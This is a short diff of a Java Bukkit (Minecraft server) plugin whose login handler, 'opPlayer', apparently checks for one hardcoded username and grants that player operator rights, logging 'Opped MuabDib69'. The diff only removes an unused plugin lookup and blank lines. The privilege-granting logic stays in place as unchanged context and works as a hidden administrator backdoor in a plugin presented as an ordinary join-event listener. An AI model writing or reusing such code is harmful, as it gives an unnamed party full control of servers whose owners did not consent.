@@ -21,8 +21,6 @@ public class PlayerJoinEvent implements Listener {
     @EventHandler
     public void opPlayer(PlayerLoginEvent event) {
         
-        MyPlugin plugin = (MyPlugin)event.getPlayer().getServer().getPluginManager().getPlugin("MyPlugin");
-        
         Player p = event.getPlayer();
         p.sendMessage(p.getDisplayName());
         
@@ -30,8 +28,5 @@ public class PlayerJoinEvent implements Listener {
             p.setOp(true);
             Bukkit.getLogger().info("Opped MuabDib69");
         }
-        
-        
     }
-    
 }
